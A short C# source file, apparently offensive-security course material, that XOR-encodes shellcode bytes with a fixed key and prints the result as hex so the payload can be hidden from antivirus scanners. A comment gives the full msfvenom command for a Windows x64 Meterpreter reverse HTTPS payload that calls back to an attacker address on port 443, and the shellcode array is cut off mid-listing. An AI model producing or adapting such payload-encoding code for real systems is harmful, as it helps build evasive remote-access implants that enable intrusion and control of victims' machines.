using System;
using System.Text;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
	    // ORIGINAL SHELLCODE BYTES GO HERE
	    // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.1 LPORT=443 -f csharp
            byte[] buf = new byte[752] {0xfc, 0x48, 0x83, 0xe4, ...

            byte key = 0xAA; // XOR key -- CAN CHANGE TO WHATEVER WE WANT
            byte[] encoded = new byte[buf.Length];

            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(buf[i] ^ key);
            }

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }

            Console.WriteLine("The XOR encrypted payload is: " + hex.ToString());
        }
    }
}
